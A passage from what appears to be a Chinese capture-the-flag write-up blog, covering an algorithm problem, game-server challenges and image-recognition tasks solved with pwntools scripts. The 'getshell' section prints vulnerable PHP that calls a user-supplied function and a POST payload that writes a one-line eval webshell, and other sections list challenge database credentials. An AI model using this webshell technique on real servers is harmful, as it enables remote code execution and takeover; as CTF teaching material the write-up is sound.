class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> cmp_to_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_sort</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> y[<span class="number">0</span>] * x[<span class="number">2</span>] - x[<span class="number">0</span>] * y[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_min_attack</span>(<span class="params">neo_life, smiths</span>):</span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    r = <span class="number">1000</span></span><br><span class="line">    ans = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        s = [(k[<span class="number">0</span>], k[<span class="number">1</span>], (k[<span class="number">1</span>]+m-<span class="number">1</span>)//m) <span class="keyword">for</span> k <span class="keyword">in</span> smiths]</span><br><span class="line">        s.sort(key=cmp_to_key(custom_sort))</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            res += t*s[i][<span class="number">0</span>]</span><br><span class="line">            t += s[i][<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> res &lt; neo_life:</span><br><span class="line">            ans = m</span><br><span class="line">            r = m - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">N, H = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split()))</span><br><span class="line">smiths = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    smiths.append(<span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(find_min_attack(H, smiths))</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="gaming"><a href="#gaming" class="headerlink" title="gaming"></a>gaming</h2><h3 id="游戏来咯"><a href="#游戏来咯" class="headerlink" title="游戏来咯"></a>游戏来咯</h3><p>登录游戏就在公告栏看到flag：<code>flag&#123;churusanguo&#125;</code>。</p><p>​    </p><h3 id="攻城拔寨"><a href="#攻城拔寨" class="headerlink" title="攻城拔寨"></a>攻城拔寨</h3><p>达到一定等级后游戏内会收到邮件，按 <strong>getshell</strong> 一题拿到权限后，找到 <code>D:/APMServ5.2.6/www/htdocs/server/config/db.php</code>，得到mysql数据库账号密码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_persistent&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_RDBMS&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Username&#x27;</span>, <span class="string">&#x27;sgphp1g2ame&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Password&#x27;</span>, <span class="string">&#x27;@Qwer123456&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Server&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Port&#x27;</span>, <span class="string">&#x27;3306&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Database&#x27;</span>, <span class="string">&#x27;bloodwar&#x27;</span>);</span><br></pre></td></tr></table></figure><p>在蚁剑用mysql连接，账号 <code>sgphp1g2ame</code>，密码 <code>@Qwer123456</code>，在表 <code>sys_mail_sys_content</code> 中找到邮件内容：<code>恭喜恭喜, flag2 flag&#123;jiaguanjinjueN&#125;</code>。</p><p>​    </p><h3 id="特殊玩家"><a href="#特殊玩家" class="headerlink" title="特殊玩家"></a>特殊玩家</h3><p>有玩家的名字是flag，按 <strong>getshell</strong> 一题拿到权限后，源码自带修改器，打开前修改配置文件 <code>config.ini</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[config]</span><br><span class="line">IP=120.55.42.64</span><br><span class="line">数据库=bloodwar</span><br><span class="line">账号=sgphp1g2ame</span><br><span class="line">密码=@Qwer123456</span><br><span class="line">端口=3306</span><br><span class="line">路径=D:\APMServ5.2.6\www\htdocs\images\armor</span><br><span class="line">聊天端口=5308</span><br><span class="line">登录信息=</span><br></pre></td></tr></table></figure><p>打开修改器，在用户基本信息发现用户名 <code>flag&#123;mysqlwo&#125;</code>。</p><p>​    </p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>在源码 <code>APMServ5.2.6/www/htdocs/server/game/BattleNetGateway.php</code> 中发现容易控制传值的代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;interface.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;utils.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;BattleFunc.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;HeroFunc.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;BattleNetServices.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(PHP_OS, <span class="number">0</span>, <span class="number">3</span>) == <span class="string">&#x27;WIN&#x27;</span>) <span class="title function_ invoke__">define</span>(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;;&#x27;</span>); <span class="keyword">else</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;:&#x27;</span>);&#125;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;include_path&#x27;</span>,<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.<span class="title function_ invoke__">realpath</span>(<span class="string">&quot;../&quot;</span>)); </span><br><span class="line"></span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_POST</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$param</span>))<span class="variable">$param</span>=<span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$from_uid</span>=<span class="variable">$param</span>[<span class="string">&quot;from_uid&quot;</span>];</span><br><span class="line"><span class="variable">$sign</span>=<span class="variable">$param</span>[<span class="string">&quot;sign&quot;</span>];</span><br><span class="line"><span class="variable">$commandFunc</span>=<span class="variable">$param</span>[<span class="string">&quot;commandFunc&quot;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$param</span>[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line"><span class="variable">$content_encoding</span>=<span class="variable">$param</span>[<span class="string">&quot;content-encoding&quot;</span>];</span><br><span class="line"><span class="comment">//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$sign</span>!=<span class="title function_ invoke__">md5</span>(<span class="variable">$from_uid</span>.<span class="variable">$commandFunc</span>.<span class="variable">$content</span>.BATTLE_NET_KEY))  <span class="comment">//sign为传入值与key连接字符串的md5值</span></span><br><span class="line"><span class="variable">$ret</span>[]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$content_encoding</span>==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$content</span>);  <span class="comment">//按|分割content传入内容</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$inputParams</span>)==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="variable">$inputParams</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="variable">$commandFunc</span>(<span class="variable">$from_uid</span>,<span class="variable">$inputParams</span>); <span class="comment">//RCE漏洞</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$content</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$inputParams</span>)&amp;&amp;<span class="title function_ invoke__">count</span>(<span class="variable">$inputParams</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">     <span class="variable">$inputParams</span>=<span class="title function_ invoke__">array_shift</span>(<span class="variable">$inputParams</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="variable">$commandFunc</span>(<span class="variable">$from_uid</span>,<span class="variable">$inputParams</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ret</span>[] = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$content_encoding</span>==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$ret</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>此处可以RCE，分析代码逻辑，利用 <code>file_put_contents</code> 写入一句话木马：</p><p>POST: <code>from_uid=xx.php&amp;commandFunc=file_put_contents&amp;content=&lt;%3fphp%20%40eval($_POST[xxx])%3b&amp;content-encoding=csv&amp;sign=734c00692057aaf9f6c763f405cbec6b</code></p><p>蚁剑连接，在D:目录下找到 <code>flag.txt</code>，flag：<code>flag&#123;breakItAndOutIt&#125;</code>。</p><p>​    </p><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><h3 id="文字频率分析"><a href="#文字频率分析" class="headerlink" title="文字频率分析"></a>文字频率分析</h3><p>非预期解法，将1000×1000图片分割为400张50×50的图片：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        box = (<span class="number">50</span>*i,<span class="number">50</span>*j,<span class="number">50</span>*(i+<span class="number">1</span>),<span class="number">50</span>*(j+<span class="number">1</span>))</span><br><span class="line">        region = im.crop(box)</span><br><span class="line">        region.save(<span class="string">f&#x27;img/<span class="subst">&#123;c&#125;</span>.png&#x27;</span>)</span><br><span class="line">        c += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>测试发现相同字母的图片，其文件md5值相同，利用此规律统计字频，先操作一次找出26个字母对应文件的md5值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">sample = [<span class="number">7</span>,<span class="number">38</span>,<span class="number">28</span>,<span class="number">0</span>,<span class="number">73</span>,<span class="number">13</span>,<span class="number">42</span>,<span class="number">18</span>,<span class="number">36</span>,<span class="number">102</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">19</span>,</span><br><span class="line">    <span class="number">9</span>,<span class="number">58</span>,<span class="number">20</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">30</span>,<span class="number">50</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">22</span>,<span class="number">8</span>,<span class="number">66</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">    path = <span class="string">fr&#x27;C:\Users\admin\Desktop\img\&#123;i&#125;.png&#x27;</span></span><br><span class="line">    m.append(md5(<span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest())</span><br><span class="line"></span><br><span class="line">res = Counter(m)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"></span><br><span class="line">alp_md5 = [m[sample[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"><span class="built_in">print</span>(alp_md5)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 得到md5对应list</span></span><br><span class="line"><span class="comment"># [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;]</span></span><br></pre></td></tr></table></figure><p>再综合起来解题：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">20382</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;plaintext: &quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">26</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;md5_hex -&gt; &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">6</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, suffix+proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(b64decode(r.recvline().strip()))</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        box = (<span class="number">50</span>*i,<span class="number">50</span>*j,<span class="number">50</span>*(i+<span class="number">1</span>),<span class="number">50</span>*(j+<span class="number">1</span>))</span><br><span class="line">        region = im.crop(box)</span><br><span class="line">        region.save(<span class="string">&#x27;img/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">sample = [<span class="string">&#x27;d108ad1582e37a825d092131a55babcc&#x27;</span>, <span class="string">&#x27;9901603c7d2a5dde25723c9e569428da&#x27;</span>, <span class="string">&#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;</span>, <span class="string">&#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;</span>, <span class="string">&#x27;33ff92480ee08585d901ffd0a47de021&#x27;</span>, <span class="string">&#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;</span>, <span class="string">&#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;</span>, <span class="string">&#x27;4497c04cea4897727d88f7945bc86d77&#x27;</span>, <span class="string">&#x27;047fd19a9a30301444e11394ee99d8be&#x27;</span>, <span class="string">&#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;</span>, <span class="string">&#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;</span>, <span class="string">&#x27;109d33cf832c83ebebca8c4f165862a9&#x27;</span>, <span class="string">&#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;</span>, <span class="string">&#x27;121808a4d3f160f235f27cb77355d525&#x27;</span>, <span class="string">&#x27;b15356da578f67bac5a3d777913ce97d&#x27;</span>, <span class="string">&#x27;a174639d2070109e85ffb53657d5c9d5&#x27;</span>, <span class="string">&#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;</span>, <span class="string">&#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;</span>, <span class="string">&#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;</span>, <span class="string">&#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;</span>, <span class="string">&#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;</span>, <span class="string">&#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;</span>, <span class="string">&#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;</span>, <span class="string">&#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;</span>, <span class="string">&#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;</span>, <span class="string">&#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">    path = <span class="string">&#x27;img/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    x = md5(<span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest()</span><br><span class="line">    m.append(x)</span><br><span class="line"></span><br><span class="line">res = Counter(m)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"></span><br><span class="line">out = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    out.append(res[sample[i]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(out).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).strip(<span class="string">&#x27;[&#x27;</span>).strip(<span class="string">&#x27;]&#x27;</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Got it!</span><br><span class="line">flag&#123;d8b8a96466e21df8b45cce5ce875e95e&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="图片识别"><a href="#图片识别" class="headerlink" title="图片识别"></a>图片识别</h3><p>给定动物样本数据，判断随机抽取10次动物图片，输入动物名称，正确至少8次给flag，每次3s内输入。</p><p>数量较少，非预期直接按照图片手动判断在3s内快速输入即可。</p><p>半自动交互：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">28452</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;plaintext: &quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">26</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;md5_hex -&gt; &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">6</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, suffix+proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;animal.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(b64decode(r.recvline().strip()))</span><br><span class="line">    img = Image.<span class="built_in">open</span>(<span class="string">&#x27;animal.png&#x27;</span>)</span><br><span 